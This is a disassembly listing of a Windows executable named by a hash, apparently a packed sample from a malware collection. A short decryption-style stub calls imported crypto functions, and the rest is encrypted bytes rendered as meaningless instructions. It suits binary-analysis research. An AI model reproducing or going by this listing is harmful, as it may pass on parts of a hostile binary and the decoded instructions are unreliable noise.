
eba46ebdab35f66fdbcce2a2371097b04098f9957a601ff158cb5e47ea6d80e2.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x70
  401006:	mov    DWORD PTR [ebp-0x48],0x0
  40100d:	mov    DWORD PTR [ebp-0x18],0x0
  401014:	mov    DWORD PTR [ebp-0x70],0x0
  40101b:	mov    DWORD PTR [ebp-0x60],0x0
  401022:	mov    DWORD PTR [ebp-0x8],0x0
  401029:	mov    DWORD PTR [ebp-0x6c],0x0
  401030:	mov    DWORD PTR [ebp-0x68],0x0
  401037:	mov    DWORD PTR [ebp-0x14],0x0
  40103e:	mov    DWORD PTR [ebp-0x4c],0x0
  401045:	mov    DWORD PTR [ebp-0x10],0x0
  40104c:	mov    DWORD PTR [ebp-0x58],0x0
  401053:	mov    DWORD PTR [ebp-0x4],0x0
  40105a:	mov    DWORD PTR [ebp-0x5c],0x0
  401061:	mov    DWORD PTR [ebp-0x30],0x0
  401068:	mov    DWORD PTR [ebp-0x54],0x0
  40106f:	mov    DWORD PTR [ebp-0x2c],0x0
  401076:	mov    DWORD PTR [ebp-0x50],0x0
  40107d:	mov    DWORD PTR [ebp-0xc],0x0
  401084:	mov    eax,ds:0x4493e8
  401089:	mov    DWORD PTR [ebp-0x28],eax
  40108c:	mov    ecx,DWORD PTR ds:0x4493ec
  401092:	mov    DWORD PTR [ebp-0x24],ecx
  401095:	mov    edx,DWORD PTR ds:0x4493f0
  40109b:	mov    DWORD PTR [ebp-0x20],edx
  40109e:	mov    al,ds:0x4493f4
  4010a3:	mov    BYTE PTR [ebp-0x1c],al
  4010a6:	mov    ecx,DWORD PTR ds:0x4493f8
  4010ac:	mov    DWORD PTR [ebp-0x40],ecx
  4010af:	mov    edx,DWORD PTR ds:0x4493fc
  4010b5:	mov    DWORD PTR [ebp-0x3c],edx
  4010b8:	mov    eax,ds:0x449400
  4010bd:	mov    DWORD PTR [ebp-0x38],eax
  4010c0:	mov    cx,WORD PTR ds:0x449404
  4010c7:	mov    WORD PTR [ebp-0x34],cx
  4010cb:	mov    dl,BYTE PTR ds:0x449406
  4010d1:	mov    BYTE PTR [ebp-0x32],dl
  4010d4:	mov    DWORD PTR [ebp-0x30],0x40
  4010db:	lea    eax,[ebp-0x40]
  4010de:	push   eax
  4010df:	lea    ecx,[ebp-0x10]
  4010e2:	push   ecx
  4010e3:	call   DWORD PTR ds:0x417004
  4010e9:	test   eax,eax
  4010eb:	je     0x41534a
  4010f1:	push   0x1
  4010f3:	lea    edx,[ebp-0x10]
  4010f6:	push   edx
  4010f7:	call   DWORD PTR ds:0x417008
  4010fd:	lea    eax,[ebp-0x10]
  401100:	push   eax
  401101:	push   0x0
  401103:	push   0x0
  401105:	push   0x1
  401107:	call   DWORD PTR ds:0x41700c
  40110d:	mov    ecx,DWORD PTR [ebp-0x10]
  401110:	add    ecx,0x1
  401113:	mov    DWORD PTR [ebp-0x10],ecx
  401116:	lea    edx,[ebp-0x30]
  401119:	push   edx
  40111a:	lea    eax,[ebp-0x50]
  40111d:	push   eax
  40111e:	push   0x40
  401120:	push   0x7
  401122:	push   0x0
  401124:	mov    ecx,DWORD PTR [ebp-0x50]
  401127:	push   ecx
  401128:	call   DWORD PTR ds:0x417000
  40112e:	lea    edx,[ebp-0x50]
  401131:	push   edx
  401132:	push   0x0
  401134:	push   0x8003
  401139:	mov    eax,DWORD PTR [ebp-0x50]
  40113c:	push   eax
  40113d:	call   DWORD PTR ds:0x417010
  401143:	lea    ecx,[ebp-0x50]
  401146:	push   ecx
  401147:	push   0x0
  401149:	push   0x0
  40114b:	push   0x8003
  401150:	mov    edx,DWORD PTR [ebp-0x50]
  401153:	push   edx
  401154:	call   DWORD PTR ds:0x417018
  40115a:	lea    eax,[ebp-0x50]
  40115d:	push   eax
  40115e:	push   0x0
  401160:	push   0x0
  401162:	push   0x0
  401164:	mov    ecx,DWORD PTR [ebp-0x50]
  401167:	push   ecx
  401168:	call   DWORD PTR ds:0x417014
  40116e:	xor    eax,0x2cbd9c39
  401173:	inc    ebp
  401174:	fisub  DWORD PTR [ecx+0x57]
  401177:	and    al,0xfa
  401179:	dec    ebp
  40117a:	sbb    BYTE PTR [eax+0x6294719d],ah
  401180:	sbb    DWORD PTR [edx+0x29e4c73f],ebp
  401186:	jns    0x4011a2
  401188:	or     ebp,0xffffffcd
  40118b:	mov    cl,bl
  40118d:	push   ds
  40118e:	xor    ebx,DWORD PTR [esi+0x8c915f]
  401194:	sbb    ch,BYTE PTR [esi]
  401196:	pop    ds
  401197:	mov    ebp,0x81811ec3
  40119c:	push   ebx
  40119d:	jns    0x40120a
  40119f:	adc    edx,ebp
  4011a1:	xor    esi,DWORD PTR [ebp-0x3a12cfd8]
  4011a7:	test   DWORD PTR [esp+ebp*1-0x3a],ecx
  4011ab:	icebp  
  4011ac:	repz dec esp
  4011ae:	push   esp
  4011af:	sub    BYTE PTR [esi-0x5c],dh
  4011b2:	mov    edx,0x351fd95e
  4011b7:	sbb    ah,ah
  4011b9:	push   ebp
  4011ba:	and    DWORD PTR [edi+0x6d],edi
  4011bd:	pop    ss
  4011be:	inc    esp
  4011bf:	stos   DWORD PTR es:[edi],eax
  4011c0:	adc    ebx,DWORD PTR ds:0xd31d1d08
  4011c6:	push   0xeb662a47
  4011cb:	out    dx,al
  4011cc:	sbb    cl,dl
  4011ce:	mov    al,ds:0x3b10818b
  4011d3:	jns    0x401166
  4011d5:	sbb    DWORD PTR [ebp-0x19],esi
  4011d8:	push   edx
  4011d9:	scas   al,BYTE PTR es:[edi]
  4011da:	push   0x835608d1
  4011df:	adc    BYTE PTR [esi],cl
  4011e1:	pop    eax
  4011e2:	inc    esi
  4011e3:	xchg   ebp,eax
  4011e4:	push   ebp
  4011e5:	adc    DWORD PTR [edx*4+0x4626bbae],ecx
  4011ec:	stc    
  4011ed:	lods   al,BYTE PTR fs:[esi]
  4011ef:	cdq    
  4011f0:	rcr    DWORD PTR [ecx+0x61f4d274],1
  4011f6:	jne    0x401187
  4011f8:	rol    DWORD PTR [ebx],cl
  4011fa:	jbe    0x401214
  4011fc:	test   eax,0xc2467f35
  401201:	in     al,dx
  401202:	xchg   edi,eax
  401203:	or     BYTE PTR ds:[ebp+0x0],0x3f
  401208:	dec    eax
  401209:	(bad)  
  40120b:	int    0xff
  40120d:	push   ecx
  40120e:	stos   BYTE PTR es:[edi],al
  40120f:	sbb    eax,0x5f8b1ca5
  401214:	popf   
  401215:	jg     0x4011eb
  401217:	repz inc esp
  40121a:	test   eax,0xd16c76d6
  40121f:	bound  edx,QWORD PTR ss:[ecx-0x1]
  401223:	fcmovnbe st,st(5)
  401225:	icebp  
  401226:	add    cl,BYTE PTR [ecx+0x49]
  401229:	dec    ebx
  40122a:	arpl   WORD PTR [ebx-0x452af969],dx
  401230:	sub    eax,0x769dfeb3
  401235:	outs   dx,BYTE PTR ds:[esi]
  401236:	addr16 mov eax,0x689ff30b
  40123c:	and    al,0xd
  40123e:	jmp    0x346d:0xb43efba6
  401245:	outs   dx,BYTE PTR ds:[esi]
  401246:	lds    esp,FWORD PTR [eax-0x42]
  401249:	xchg   edi,eax
  40124a:	cmp    al,0x11
  40124c:	cli    
  40124d:	add    cl,BYTE PTR [ecx]
  40124f:	outs   dx,BYTE PTR ds:[esi]
  401250:	pusha  
  401251:	push   esp
  401252:	out    0xe9,eax
  401254:	mov    al,0xb8
  401256:	sub    BYTE PTR [ecx+eax*2-0x8],al
  40125a:	add    al,0x6
  40125c:	dec    ebx
  40125d:	inc    edi
  40125e:	retf   0x6b0e
  401261:	push   ebx
  401262:	add    bh,0x3
  401265:	sti    
  401266:	nop
  401267:	xor    al,0xce
  401269:	rcl    esi,1
  40126b:	stos   DWORD PTR es:[edi],eax
  40126c:	sbb    eax,0x2ee4b824
  401271:	lds    ebx,FWORD PTR [esi-0x5d]
  401274:	dec    esi
  401275:	dec    eax
  401276:	fcmove st,st(1)
  401278:	cli    
  401279:	jb     0x401204
  40127b:	daa    
  40127c:	mov    ecx,0x319e2a6e
  401281:	loopne 0x401226
  401283:	paddd  mm0,mm2
  401286:	mov    al,0xf1
  401288:	mov    esp,0x1e66f579
  40128d:	and    al,0xcb
  40128f:	inc    esi
  401290:	es inc esp
  401292:	jns    0x4012db
  401294:	dec    edi
  401295:	fldenv [ebx+ecx*8]
  401298:	add    dl,ah
  40129a:	add    DWORD PTR [ecx],ecx
  40129c:	push   ecx
  40129d:	pop    ds
  40129e:	mov    dh,0xd6
  4012a0:	ja     0x4012a1
  4012a2:	jns    0x4012fb
  4012a4:	ins    BYTE PTR es:[edi],dx
  4012a5:	mov    esp,0x3a6fb2bc
  4012aa:	icebp  
  4012ab:	mov    BYTE PTR [ecx+0x339c8a3c],ah
  4012b1:	or     al,0xbc
  4012b3:	icebp  
  4012b4:	(bad)  
  4012b5:	test   DWORD PTR ds:[ebp+0x52],ebx
  4012b9:	sbb    al,0x27
  4012bb:	add    al,0xa3
  4012bd:	(bad)
  4012c1:	add    esi,eax
  4012c3:	jnp    0x401323
  4012c5:	mov    WORD PTR [esi],?
  4012c7:	jns    0x401256
  4012c9:	jno    0x4012ba
  4012cb:	popa   
  4012cc:	imul   esi,DWORD PTR [esi],0xffffffe8
  4012cf:	fmul   DWORD PTR [eax*2+0x1d03b06d]
  4012d6:	inc    eax
  4012d7:	or     al,0x77
  4012d9:	cwde   
  4012da:	fst    QWORD PTR [esi-0x47]
  4012dd:	jne    0x40133e
  4012df:	arpl   si,dx
  4012e1:	lea    esi,[ecx-0x76]
  4012e4:	fs jle 0x401356
  4012e7:	ins    BYTE PTR es:[edi],dx
  4012e8:	cmp    edx,edx
  4012ea:	imul   eax,eax,0xd1ab4fd8
  4012f0:	mov    esp,0xa360596c
  4012f5:	dec    esp
  4012f6:	out    0xb,eax
  4012f8:	xadd   dl,ah
  4012fb:	fwait
  4012fc:	xchg   edx,eax
  4012fd:	je     0x401325
  4012ff:	sahf   
  401300:	ds xchg edx,eax
  401302:	lds    ebx,FWORD PTR [edx]
  401304:	mov    bh,0xd5
  401306:	iret   
  401307:	xchg   edx,eax
  401308:	xchg   ecx,eax
  401309:	adc    al,0xd3
  40130b:	xchg   edi,eax
  40130c:	sbb    al,0xf5
  40130e:	int3   
  40130f:	shl    BYTE PTR [eax+0x184fb9a5],0x9d
  401316:	mov    ds:0x2518e3c3,al
  40131b:	loop   0x40133e
  40131d:	pop    esi
  40131e:	or     eax,0xf04e7ef3
  401323:	je     0x401327
  401325:	(bad)  
  401326:	pop    ds
  401327:	cmp    ebp,eax
  401329:	and    BYTE PTR [ebp-0x36],bh
  40132c:	cmp    al,0xcc
  40132e:	repz sahf 
  401330:	ret    0x9f41
  401333:	stos   BYTE PTR es:[edi],al
  401334:	out    0x88,al
  401336:	jno    0x40139d
  401338:	and    ebx,DWORD PTR [edi-0x2b]
  40133b:	leave  
  40133c:	std    
  40133d:	inc    eax
  40133e:	add    BYTE PTR [edx+0x17c48917],ch
  401344:	jnp    0x401337
  401346:	fldcw  WORD PTR [esi+ebx*4-0x65]
  40134a:	mov    cl,0x11
  40134c:	scas   al,BYTE PTR es:[edi]
  40134d:	cdq    
  40134e:	jno    0x401343
  401350:	fxtract 
  401352:	fst    st(6)
  401354:	push   esp
  401355:	dec    ebx
  401356:	ins    DWORD PTR es:[edi],dx
  401357:	mov    BYTE PTR [ebx],cl
  401359:	and    ebp,0x61
  40135c:	iret   
  40135d:	push   edi
  40135e:	jo     0x401315
  401360:	call   0x96df:0x5cceddcb
  401367:	jno    0x4013a8
  401369:	or     ecx,edx
  40136b:	inc    ebx
  40136c:	mov    bl,0x59
  40136e:	(bad)  [ecx+0x5]
  401371:	pop    ecx
  401372:	push   ebp
  401373:	inc    ecx
  401374:	jmp    0x63f3ce3
  401379:	or     BYTE PTR [ecx],dh
  40137b:	outs   dx,DWORD PTR ds:[esi]
  40137c:	hlt    
  40137d:	(bad)  
  40137e:	pop    esp
  40137f:	fnstcw WORD PTR [eax]
  401381:	sbb    BYTE PTR [ebp-0x29],dl
  401384:	lea    ebp,[ebp+eiz*8-0x78]
  401388:	and    bh,bl
  40138a:	into   
  40138b:	int3   
  40138c:	mov    al,ds:0xd561af7
  401391:	mov    eax,0x6003ab4d
  401396:	repz inc ebx
  401398:	or     eax,0xa399cd32
  40139d:	int3   
  40139e:	sbb    DWORD PTR [ecx],edi
  4013a0:	mov    esi,0x745150bb
  4013a5:	test   BYTE PTR [edi-0x22],dh
  4013a8:	cmc    
  4013a9:	jo     0x401420
  4013ab:	mov    ch,0x3d
  4013ad:	dec    esp
  4013ae:	test   ch,al
  4013b0:	out    dx,al
  4013b1:	and    BYTE PTR [eax+ebp*8+0x1fedb500],ah
  4013b8:	jp     0x4013fd
  4013ba:	shr    BYTE PTR [esi+0x73ecd147],cl
  4013c0:	and    ebp,DWORD PTR [ebp+0x11]
  4013c3:	adc    edx,edi
  4013c5:	xchg   ebp,eax
  4013c6:	push   eax
  4013c7:	push   cs
  4013c8:	ret    
  4013c9:	lods   eax,DWORD PTR ds:[esi]
  4013ca:	sbb    eax,edx
  4013cc:	dec    ebp
  4013cd:	sti    
  4013ce:	inc    eax
  4013cf:	fpatan 
  4013d1:	call   0x39a7:0xd05fdcf0
  4013d8:	mov    esp,0x26b43a4f
  4013dd:	jg     0x401420
  4013df:	dec    ebx
  4013e0:	push   0x39
  4013e2:	mov    edx,0x63d598a0
  4013e7:	and    ebp,DWORD PTR [ebx+0xbc63770]
  4013ed:	fs sub eax,0x6f770a70
  4013f3:	out    0x27,eax
  4013f5:	dec    eax
  4013f6:	push   eax
  4013f7:	not    DWORD PTR cs:[esi+ecx*4-0x15]
  4013fc:	frstpm(287 only) 
  4013fe:	mov    ch,0xc
  401400:	add    al,0xc1
  401402:	sbb    bh,BYTE PTR [esi]
  401404:	add    eax,DWORD PTR [edx]
  401406:	sub    al,0x99
  401408:	pop    edi
  401409:	mov    edx,0x4eb07634
  40140e:	add    BYTE PTR [ebx+0x1525fa13],cl
  401414:	data16 mov bh,0x2e
  401417:	pop    eax
  401418:	mov    esp,0xaad9b99
  40141d:	pusha  
  40141e:	push   ss
  40141f:	xchg   BYTE PTR [eax+0x43abdf47],ah
  401425:	test   cl,ah
  401427:	and    al,0xd5
  401429:	cmp    al,0x53
  40142b:	mov    esp,DWORD PTR [edx+0x4bca9255]
  401431:	xor    al,BYTE PTR [esi-0xfca1588]
  401437:	inc    ebx
  401438:	jnp    0x4013d0
  40143a:	or     al,0x78
  40143c:	call   0xa1ba:0x4fd91b86
  401443:	jae    0x40140b
  401445:	jnp    0x401429
  401447:	inc    ebx
  401448:	dec    eax
  401449:	retf   
  40144a:	inc    esi
  40144b:	adc    eax,0xded9cb27
  401450:	lea    edi,[ecx-0x13]
  401453:	aas    
  401454:	scas   eax,DWORD PTR es:[edi]
  401455:	clc    
  401456:	inc    eax
  401457:	es popf 
  401459:	and    edx,ebx
  40145b:	lods   al,BYTE PTR ds:[esi]
  40145c:	or     DWORD PTR [edx-0x2a],esp
  40145f:	jp     0x401406
  401461:	rcl    DWORD PTR [edx+0x7f],cl
  401464:	pop    edi
  401465:	loop   0x4013ff
  401467:	pop    ecx
  401468:	addr16 xor eax,0xdfef5833
  40146e:	adc    eax,0x38068094
  401473:	cli    
  401474:	test   BYTE PTR [ebx+0x2cab5032],bh
  40147a:	je     0x40145d
  40147c:	fdivp  st(6),st
  40147e:	push   ecx
  40147f:	cmp    ecx,ecx
  401481:	add    al,BYTE PTR [bx+0x5175]
  401486:	xor    ch,bh
  401488:	jbe    0x4014fc
  40148a:	(bad)  
  40148d:	xchg   BYTE PTR [edi+0x4f],ch
  401490:	dec    esp
  401491:	test   DWORD PTR [ebp-0x5a],ebp
  401494:	jg     0x40142a
  401496:	dec    ebp
  401497:	into   
  401498:	out    0x5b,eax
  40149a:	imul   esp,DWORD PTR [eax-0x781151d0],0x6b151f4a
  4014a4:	cs pop ecx
  4014a6:	mov    esi,0xf8e11c34
  4014ab:	(bad)  
  4014ac:	adc    DWORD PTR [edi+0x4b],ebx
  4014af:	sub    bl,al
  4014b1:	jns    0x4014a7
  4014b3:	mov    dh,0x39
  4014b5:	call   0x73094bae
  4014ba:	mov    dl,0xbe
  4014bc:	fidivr WORD PTR [edi+0x33]
  4014bf:	pop    ebp
  4014c0:	outs   dx,DWORD PTR ds:[esi]
  4014c1:	mov    bl,0xe4
  4014c3:	xchg   esi,eax
  4014c4:	vunpckhps ymm0,ymm4,YMMWORD PTR [edi-0x7548eaa6]
  4014cc:	mov    ?,WORD PTR [ebx+0x54]
  4014cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014d0:	jbe    0x401547
  4014d2:	mov    al,0x3c
  4014d4:	in     al,dx
  4014d5:	pop    esi
  4014d6:	jp     0x4014eb
  4014d8:	push   edi
  4014d9:	xchg   edx,eax
  4014da:	jns    0x4014bf
  4014dc:	mov    esi,0x127064e5
  4014e1:	aam    0xf7
  4014e3:	hlt    
  4014e4:	xor    al,0xed
  4014e6:	bound  esp,QWORD PTR [ebx]
  4014e8:	outs   dx,DWORD PTR ds:[esi]
  4014e9:	dec    edi
  4014ea:	xor    al,0x4d
  4014ec:	xor    al,0x80
  4014ee:	repnz imul eax,edx,0xffffff8e
  4014f2:	push   eax
  4014f3:	outs   dx,DWORD PTR ds:[esi]
  4014f4:	and    ebx,DWORD PTR [ebp+edx*4+0x52038020]
  4014fb:	inc    ecx
  4014fc:	ins    DWORD PTR es:[edi],dx
  4014fd:	mov    cs,esp
  4014ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401500:	xor    al,BYTE PTR [ebx]
  401502:	mov    ecx,0xf1a71bfb
  401507:	test   BYTE PTR [edi+0x18],ah
  40150a:	arpl   WORD PTR ds:[edi+esi*1],bx
  40150e:	jmp    0xd90a:0x20032b3
  401515:	adc    ecx,DWORD PTR [esi+0x48245b39]
  40151b:	or     eax,esp
  40151d:	adc    eax,0x561759d1
  401522:	pop    edi
  401523:	mul    DWORD PTR [eax-0x2c8cf023]
  401529:	mov    cl,0xf7
  40152b:	lahf   
  40152c:	sti    
  40152d:	hlt    
  40152e:	xchg   ebx,eax
  40152f:	cmp    al,0xc
  401531:	idiv   cl
  401533:	ret    0xb6bb
  401536:	dec    eax
  401537:	adc    eax,DWORD PTR [eax+ebp*4-0x3f]
  40153b:	mov    bl,0x24
  40153d:	ret    
  40153e:	mov    BYTE PTR [ecx+0x2b996a2],cl
  401544:	or     eax,0xab496de9
  401549:	push   cs
  40154a:	push   cs
  40154b:	cmp    ch,BYTE PTR [eax+eax*2-0x3e]
  40154f:	mov    ebx,0x422bdf32
  401554:	stos   DWORD PTR es:[edi],eax
  401555:	daa    
  401556:	scas   al,BYTE PTR es:[edi]
  401557:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401558:	sahf   
  401559:	xchg   ebp,eax
  40155a:	fnsave [edx]
  40155c:	frstor [edx+edi*4]
  40155f:	mov    dl,0xe8
  401561:	in     eax,dx
  401562:	cmp    eax,DWORD PTR [esi+0x719f5317]
  401568:	adc    ecx,ecx
  40156a:	xor    DWORD PTR [esi-0x42ad1987],esi
  401570:	imul   esi,DWORD PTR ds:0x6e0a0d51,0xdbda9c04
  40157a:	loopne 0x401560
  40157c:	pop    ecx
  40157d:	mov    ch,0x3c
  40157f:	enter  0x84ef,0xc3
  401583:	or     BYTE PTR [ecx+0x78],0xac
  401587:	in     al,dx
  401588:	mov    edx,0x5b36261
  40158d:	sub    BYTE PTR [ecx+0x39],dl
  401590:	mov    ch,0xac
  401592:	jae    0x4015ae
  401594:	xor    eax,0xb0525510
  401599:	push   ds
  40159a:	ror    BYTE PTR [ecx],0xf1
  40159d:	cmp    ch,bh
  40159f:	sbb    ebp,esi
  4015a1:	icebp  
  4015a2:	sub    esi,DWORD PTR [edx+0x52]
  4015a5:	jb     0x40160e
  4015a7:	xlat   BYTE PTR ds:[ebx]
  4015a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015a9:	pop    eax
  4015aa:	add    eax,ecx
  4015ac:	add    edi,DWORD PTR [ebp+0x46]
  4015af:	(bad)  
  4015b0:	std    
  4015b1:	ss mov edx,fs
  4015b4:	pop    esp
  4015b5:	dec    esi
  4015b6:	mov    DWORD PTR [ebx-0x24],0x81193b8c
  4015bd:	xor    BYTE PTR [edi-0x78d5405a],cl
  4015c3:	cmp    DWORD PTR [esi+ecx*4],edi
  4015c6:	cmc    
  4015c7:	sbb    ch,BYTE PTR ds:[esi-0x35]
  4015cb:	adc    ah,al
  4015cd:	dec    ecx
  4015ce:	push   ecx
  4015cf:	add    BYTE PTR [ecx+0x6ef186fe],0x3c
  4015d6:	(bad)  
  4015d7:	mov    esi,0xaab512b1
  4015dc:	mov    ch,0xcf
  4015de:	(bad)  
  4015df:	lods   eax,DWORD PTR ds:[esi]
  4015e0:	add    al,0xd9
  4015e2:	jmp    0x3477a53f
  4015e7:	mov    ah,0xdc
  4015e9:	xchg   ebp,eax
  4015ea:	cmc    
  4015eb:	outs   dx,BYTE PTR ds:[esi]
  4015ec:	mov    dh,0xd5
  4015ee:	xchg   esp,eax
  4015ef:	fs ret 
  4015f1:	es and al,0xc0
  4015f4:	ins    BYTE PTR es:[edi],dx
  4015f5:	hlt    
  4015f6:	fisttp WORD PTR [esi+eiz*4]
  4015f9:	pop    ebp
  4015fa:	cmp    al,0x40
  4015fc:	or     DWORD PTR [esp+ebx*1-0x25],esp
  401600:	inc    esi
  401601:	jg     0x40162c
  401603:	retf   
  401604:	inc    ebx
  401605:	mov    edx,eax
  401607:	adc    al,0xff
  401609:	add    eax,DWORD PTR [esi+edi*1+0x10]
  40160d:	pop    esp
  40160e:	mov    ebx,0x585aea2b
  401613:	sbb    DWORD PTR [eax-0x1b],ebp
  401616:	and    al,0x4e
  401618:	mov    ch,0xe2
  40161a:	push   esi
  40161b:	scas   al,BYTE PTR es:[edi]
  40161c:	dec    ebp
  40161d:	xor    eax,0x207e74a9
  401622:	xor    esi,ecx
  401624:	mov    bl,0x67
  401626:	loopne 0x4015ec
  401628:	pop    edi
  401629:	fist   DWORD PTR [edx+0x27]
  40162d:	push   ds
  40162e:	add    BYTE PTR [edx],dh
  401630:	int3   
  401631:	lea    esi,[ebx-0x630f111b]
  401637:	jmp    0xb89:0x171babf5
  40163e:	lahf   
  40163f:	push   ebp
  401640:	cmc    
  401641:	xchg   ebx,eax
  401642:	dec    ebp
  401643:	adc    eax,0x1fcf3dc1
  401648:	call   0xee65489e
  40164d:	loopne 0x4016c1
  40164f:	cmc    
  401650:	sub    ebx,DWORD PTR [edi+esi*8-0x28121a9]
  401657:	gs pop ecx
  401659:	(bad)  
  40165a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40165b:	fidivr DWORD PTR [ecx]
  40165d:	push   edi
  40165e:	or     DWORD PTR [edx+0x2537fb5f],ecx
  401664:	or     ecx,DWORD PTR [esi+0x6e]
  401667:	stos   BYTE PTR es:[edi],al
  401668:	push   ss
  401669:	xchg   DWORD PTR [eax],edx
  40166b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40166c:	or     ebx,DWORD PTR [ecx]
  40166e:	div    DWORD PTR [ecx+0x62a9e9d2]
  401674:	daa    
  401675:	popf   
  401676:	div    DWORD PTR [edi]
  401678:	repz and DWORD PTR [ecx],esi
  40167b:	mov    edi,0xa787cba4
  401680:	mov    dl,0x57
  401682:	jp     0x401695
  401684:	sub    BYTE PTR [edx-0x31270020],bh
  40168a:	mov    dl,0xb5
  40168c:	cmp    eax,0x1b04dc1d
  401691:	dec    ecx
  401692:	pushf  
  401693:	pop    ebx
  401694:	sahf   
  401695:	pop    eax
  401697:	pop    ebx
  401698:	iret   
  401699:	lods   eax,DWORD PTR gs:[esi]
  40169b:	xchg   esi,eax
  40169c:	mov    eax,ds:0x9fa441ad
  4016a1:	das    
  4016a2:	sbb    esp,edi
  4016a4:	call   0x9b95:0xae94004d
  4016ab:	mov    al,ds:0xd8dfeedc
  4016b0:	xchg   esi,eax
  4016b1:	pop    edi
  4016b2:	jnp    0x4016b0
  4016b4:	int    0x18
  4016b6:	add    al,0x11
  4016b8:	aas    
  4016b9:	dec    edx
  4016ba:	into   
  4016bb:	pop    esi
  4016bc:	pop    edi
  4016bd:	sahf   
  4016be:	xchg   ecx,eax
  4016bf:	sub    bl,BYTE PTR [edx-0x69034e62]
  4016c5:	mov    ecx,0xaefd256d
  4016ca:	pop    ebp
  4016cb:	xchg   edx,eax
  4016cc:	sbb    ah,BYTE PTR [eax-0x4061d580]
  4016d2:	pusha  
  4016d3:	jl     0x4016ad
  4016d5:	fdiv   st,st(2)
  4016d7:	scas   eax,DWORD PTR es:[edi]
  4016d8:	ja     0x401718
  4016da:	js     0x4016a1
  4016dc:	arpl   bx,sp
  4016de:	test   BYTE PTR [ebp-0x45f9bb1a],cl
  4016e4:	dec    esi
  4016e5:	xor    al,0xff
  4016e7:	jb     0x401747
  4016e9:	and    DWORD PTR [edi+0x25],ebp
  4016ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016ed:	push   ss
  4016ee:	outs   dx,DWORD PTR ds:[esi]
  4016ef:	mov    ds:0xa8b16c9b,eax
  4016f4:	xor    al,BYTE PTR [esi]
  4016f6:	mov    edi,0x1c0cf3a9
  4016fb:	pushf  
  4016fc:	aam    0x5b
  4016fe:	lock pushf 
  401700:	pop    esi
  401701:	and    esi,edi
  401703:	sub    WORD PTR fs:[esi],bx
  401707:	and    al,0xf5
  401709:	adc    eax,0x545810dc
  40170e:	cmc    
  40170f:	loop   0x401712
  401711:	jmp    0x401761
  401713:	xchg   BYTE PTR [ebp-0xa],dh
  401716:	ret    
  401717:	pop    eax
  401718:	adc    eax,0x2550bcd4
  40171d:	adc    eax,0x1c1d7abc
  401722:	mov    esi,0x12b50f0f
  401727:	cld    
  401728:	dec    ecx
  401729:	sub    ah,BYTE PTR [eax+edi*2+0xa13475e]
  401730:	jp     0x401715
  401732:	stos   DWORD PTR es:[edi],eax
  401733:	nop
  401734:	dec    ebx
  401735:	arpl   WORD PTR [esi+0x17c877df],sp
  40173b:	jecxz  0x401769
  40173d:	pop    es
  40173e:	jecxz  0x4016e4
  401740:	push   ss
  401741:	mov    ah,BYTE PTR [ebp-0x46]
  401744:	das    
  401745:	add    eax,0x79743f83
  40174a:	dec    eax
  40174b:	push   edi
  40174c:	push   ebx
  40174d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40174e:	sar    esi,cl
  401750:	daa    
  401751:	ja     0x401769
  401753:	add    esi,edx
  401755:	pop    ebx
  401756:	mov    ds:0x490183ec,eax
  40175b:	fcom   QWORD PTR [ebp-0x26]
  40175e:	cmc    
  40175f:	add    al,0x95
  401761:	(bad)  
  401762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401763:	or     esi,DWORD PTR [edi]
  401765:	in     eax,0x50
  401767:	or     al,0x1f
  401769:	mov    bh,0xd7
  40176b:	mov    bh,BYTE PTR [edx]
  40176d:	cld    
  40176e:	cs jne 0x4016f5
  401771:	adc    DWORD PTR [eax+ebx*4],esp
  401774:	mov    eax,ds:0x42e62d80
  401779:	aam    0xfb
  40177b:	bound  esp,QWORD PTR [esi]
  40177d:	or     BYTE PTR [ecx-0x57168aec],bl
  401783:	retf   0xb425
  401786:	jnp    0x401748
  401788:	mov    ds:0x1e9dff80,al
  40178d:	nop
  40178e:	mov    al,ds:0x205019ec
  401793:	xor    al,0xd7
  401795:	ins    DWORD PTR es:[edi],dx
  401796:	rcr    bl,cl
  401798:	jo     0x4017f1
  40179a:	mov    DWORD PTR [ebx-0x6c112f89],esi
  4017a0:	aaa    
  4017a1:	mov    ds,WORD PTR [ebp+0x56]
  4017a4:	mov    eax,es:0x9df7824b
  4017aa:	shl    BYTE PTR [edx+0x1a],cl
  4017ad:	fnstcw WORD PTR [edi+0x579ed877]
  4017b3:	aaa    
  4017b4:	xor    eax,0xa67ebd7a
  4017b9:	mov    ebx,0xa79d4663
  4017be:	std    
  4017bf:	enter  0xe741,0x4d
  4017c3:	dec    ecx
  4017c4:	mov    eax,ds:0xc19eb86e
  4017c9:	sti    
  4017ca:	adc    BYTE PTR [ebp-0x2f429146],bl
  4017d0:	ins    DWORD PTR es:[edi],dx
  4017d1:	xchg   esi,eax
  4017d2:	pushf  
  4017d3:	test   DWORD PTR [edi-0x3d],eax
  4017d6:	shr    BYTE PTR [ebx],0x2c
  4017d9:	add    eax,0x8d5bffb8
  4017de:	jmp    0x4017a5
  4017e0:	cmp    al,bh
  4017e2:	into   
  4017e3:	js     0x401864
  4017e5:	lock dec ebx
  4017e7:	dec    eax
  4017e8:	fwait
  4017e9:	out    dx,al
  4017ea:	mov    bl,0x84
  4017ec:	mov    ah,0xd0
  4017ee:	push   ebx
  4017ef:	or     DWORD PTR [ebp-0x50],ebx
  4017f2:	mov    bh,0x4f
  4017f4:	les    esi,FWORD PTR [edx-0x3e]
  4017f7:	fisub  DWORD PTR [edx+0x213c02bf]
  4017fd:	add    eax,0xf228249c
  401802:	jne    0x4017f4
  401804:	mov    ecx,0xa6f067a6
  401809:	cli    
  40180a:	scas   al,BYTE PTR es:[edi]
  40180b:	out    0x91,al
  40180d:	dec    ecx
  40180e:	stc    
  40180f:	xor    eax,0x609b6a5b
  401814:	out    0x71,al
  401816:	(bad)  
  401817:	push   ecx
  401818:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40181a:	xor    eax,0x66540599
  40181f:	imul   eax,DWORD PTR [esi],0xffffffd7
